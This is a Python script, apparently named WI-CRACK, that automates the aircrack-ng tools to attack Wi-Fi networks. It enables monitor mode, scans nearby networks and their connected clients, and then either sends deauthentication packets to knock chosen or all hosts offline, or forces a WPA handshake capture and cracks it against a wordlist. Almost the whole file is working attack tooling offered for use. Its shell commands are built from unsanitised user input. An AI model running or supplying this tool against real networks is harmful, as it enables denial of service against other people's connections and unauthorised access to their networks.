#!/usr/bin/python3
# Copyright 2020, Aniket.N.Bhagwate, All rights reserved.
# Date Created : 8th March 2020
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
# ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
# LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
# CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
# SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
# INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
# CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
# POSSIBILITY OF SUCH DAMAGE.

import os 

os.system("mkdir DUMP 1> error.txt 2> error.txt ")
os.system("rm -rf error.txt")

banner='''
 ==========================================================================
 ==========================================================================

  __________      __        _____       ____ ____      _    ____ _  __
  \ \ \ \ \ \     \ \      / /_ _|     / ___|  _ \    / \  / ___| |/ / 
   \ \ \ \ \ \     \ \ /\ / / | |_____| |   | |_) |  / _ \| |   | ' / 
   / / / / / /      \ V  V /  | |_____| |___|  _ <  / ___ \ |___| . \ 
  /_/_/_/_/_/        \_/\_/  |___|     \____|_| \_\/_/   \_\____|_|\_\ 
  
 ==========================================================================
 		CODED BY : NullByte007 ~ Aniket Bhagwate 
 ==========================================================================
     
'''

def bann():
	os.system("clear")
	print("\033[32;40m"+banner+"\033[m")


MonMode=''
interface=[]
specific_network=[]

def getInterfaces():
	interfaces=[]
	os.system("ip link show > DUMP/interface.txt")
	f = open("DUMP/interface.txt",'r')
	f = f.read().split("\n")
	f.pop()
	
	f = f[::2]
	for x in f:
		v = x.split()[1]
		v = v[:-1]
		interface.append(v)



def MonitorMode():
	bann()
	global MonMode
	global interface
	getInterfaces()	
	rr=1
	for x in interface:
		print("===========================================")
		print("== {}  ==> {} ".format(rr,x))
		rr +=1

	print("===========================================")

	choice = int(input("\n[?] SELECT THE WIRELESS INTERFACE : "))

	print("\n[!] STARTED MONITOR MODE ON  -> {} <-".format(interface[choice-1]))
	os.system("airmon-ng start {} 1> DUMP/error.txt 2> DUMP/error.txt".format(interface[choice-1]))
	interface=[]
	getInterfaces()
	print("done-new-interfacing")
	MonMode=interface[choice-1]



def Airodump():
	bann()	
	print("=======================================")
	print("[!] CAPTURING ALL WIRELESS NETWORKS ")	
	print("=======================================")
	os.system("airodump-ng {} -w DUMP/output_wifi --write-interval 5 -o csv ".format(MonMode))
	bann()
	#metadata = input(" [◽] COPY AND PASTE ALL THE ABOVE DATA HERE ==> ")	
	'''
	for x in f:
...     x.split()[0][2]
... 

	'''
 
def extractBSSID():
	global specific_network
	global MonMode
	bann()
	f = open("DUMP/output_wifi-01.csv",'r')
	f = f.read().split("\n")
	f.remove(f[0])
	f.remove(f[0])
	cnt=0

	'''
		bssid :   x[0] 
		channel  x[3]  
		privacy :   x[5] 
		Authentication   x[7] 
		POWER   x[8] 
		ESSID   x[13])
		
	'''
	
	
	print("\033[32;40m -----------------------\n[*] CAPTURED NETWORKS\n----------------------- \033[m")
	try:
		for x in f:
			cnt+=1
			x  = x.split(",")
			print("====================================================================================================================================")
			print("[ {} ] BSSID : \033[30;42m ".format(cnt) + x[0] + " \033[m | CHANNEL : \033[30;42m" +x[3]+ " \033[m | PRIVACY : \033[30;42m" +x[5] + "\033[m | AUTHENTICATION : \033[30;42m" + x[7] +"\033[m | POWER : \033[30;42m" + x[8] +"\033[m | ESSID : \033[30;42m" + x[13] +"\033[m")  
	except:
		pass

	choice = int(input("[*] SELECT TARGET NETWORK : "))
	specific_network = f[choice-1].split(",")
		
	SpecificAirodump(specific_network[0] , specific_network[3] , MonMode , specific_network[13])
		
	
	
def SpecificAirodump(bssid,channel,monitor,essid):
	print("\n[*] GETTING CONNECTED HOSTS FOR SELECTED NETWORK : ==> \033[30;42m {} \033[m".format(essid))
	print("[!] PRESS <CTRL + C> AFTER SOME INTERVAL TO GET RESULTS ! ")
	input("\n< PRESS ENTER >")
	os.system("airodump-ng --bssid {} --channel {} --write DUMP/output --output-format csv --write-interval 3 {}".format(bssid,channel,monitor))
	bann()
	print("\033[32;40")
	
	print("==========================================================")
	print(" 	   	     SELECT CHOICE	       	         ")
	print("==========================================================")
	print(" [1] INITIATE DEAUTHENTICATION ATTACK [KICK OUT HOSTS !]  ") 
	print("==========================================================")
	print(" [2] CRACK WIRELESS NETWORK				  ")				  
	print("==========================================================")
	
	choice = input()  
	
	if choice=='1':
		bann()
		Infinite_Aireplay(bssid,monitor,essid)
		
	elif choice=='2':
		bann()
		wordlist = input("[?] ENTER (NAME / PATH) TO WORDLIST : ")
		try:
			f = open(wordlist,'r')
		
		except:
			input("[!] WORDLIST NOT FOUND ... ")
			bann()
			SpecificAirodump(bssid,channel,monitor,essid)
			
			
		input("\n[*] PRESS <ctrl + c>  WHEN YOU GET WPA HANDSHAKE")
		os.system("aireplay-ng --deauth 5 -a {} {} &".format(bssid,monitor))	# START deauth in background using "&"
		os.system("airodump-ng --bssid {} -w DUMP/wpa-handshake --channel {} {}".format(bssid,channel,monitor))
		os.system("aircrack-ng DUMP/wpa-handshake-01.cap -w {}".format(wordlist))
		input("\n\n\t\t\t[!] PRESS ENTER TO EXIT .....")
		bye(monitor)


def Infinite_Aireplay(bssid,monitor,essid):
	f = open("DUMP/output-01.csv",'r')
	f = f.read().split("\n")
	f.remove(f[0])
	f.pop()
	f.pop()
	new_index = f.index('')+2
	stations = f[new_index:] 
	cnt=0
	print("\n[*] SHOWING ALL CONNECTED STATIONS FOR : \033[30;42m " +  "{}".format(essid) + "\033[m" + "\n")
	for x in stations:
		cnt +=1
		x = x.split(",")
		x.pop()
		print("====================================================================================================================================")
		print("[ {} ] STATION : \033[30;42m ".format(cnt) + x[0] + " \033[m | BSSID : \033[30;42m" +x[5]+ " \033[m" + "\n")
	
	choice = int(input("[?] SELECT THE HOST YOU WANT TO KICK OUT ~~ OR [TYPE '0' FOR ALL] :"))
	
	if choice==0:
		packets = input("\n[*] ENTER NO OF DE-AUTH PACKETS TO SEND : [default: 0 ~ Unlimited packets] => ")
		input("\n [!] YOU CAN PRESS <CTRL + C> ANY TIME TO CLOSE DEAUTHENTICATION ! ")
		os.system("aireplay-ng --deauth {} -a {} {}".format(packets,bssid,monitor))
		bye(monitor)
	else:
		packets = input("\n[*] ENTER NO OF DE-AUTH PACKETS TO SEND : [default: 0 ~ Unlimited packets] => ")	
		input("\n [!] YOU CAN PRESS <CTRL + C> ANY TIME TO CLOSE DEAUTHENTICATION ! ")
		os.system("aireplay-ng --deauth {} -a {} -c {} {}".format(packets,bssid,stations[choice-1].split(",")[0],monitor))
		bye(monitor)
		

	# GET THE STATION ADDRESS : stations[choice-1].split(",")[0]

def bye(monitor):
	os.system("airmon-ng stop {} 2> DUMP/error.txt 1> DUMP/error.txt".format(monitor))
	os.system("rm -rf DUMP")
	os.system("clear")
	print("....BYE ! ")
	exit(0)
	
	
def main():
	print("\033[32;40m")
	print(banner)
	MonitorMode()
	Airodump()
	extractBSSID()
	print("\033[m")

if __name__=='__main__':
	main()

